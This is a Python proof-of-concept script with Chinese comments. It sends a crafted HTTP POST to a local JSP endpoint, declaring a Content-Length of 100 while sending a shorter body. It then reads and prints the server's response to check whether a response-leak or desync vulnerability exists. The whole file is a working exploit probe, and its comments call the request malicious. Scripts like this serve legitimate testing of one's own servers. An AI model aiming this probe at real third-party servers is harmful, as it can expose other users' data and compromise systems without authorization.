import socket

# 服务器地址和端口
server_address = ("127.0.0.1", 8080)


def main():
    # 创建一个 TCP/IP 套接字
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到服务器
        s.connect(server_address)

        # 构造恶意请求，实际发送的 POST BODY 内容小于 100 字节
        request_headers = (
            "POST /vulnerable.jsp HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "Connection: keep-alive\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 100\r\n"
            "\r\n"
        )
        incomplete_body = "incomplete_data=0"
        print("[*] Sending payload and waiting for timeout...")
        # 发送恶意请求
        s.sendall(request_headers.encode("utf-8"))
        s.sendall(incomplete_body.encode("utf-8"))
        # 接收响应
        response = []
        for i in range(5):
            data = s.recv(2048)
            response.append(data)
        # 组合响应数据，去除末尾的 0x00
        data = b"".join(response).decode("utf-8").rstrip("0x00")
        print(f"[!] Received (if) vulnerable response:\n{data}")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # 确保套接字关闭
        s.close()


if __name__ == "__main__":
    main()
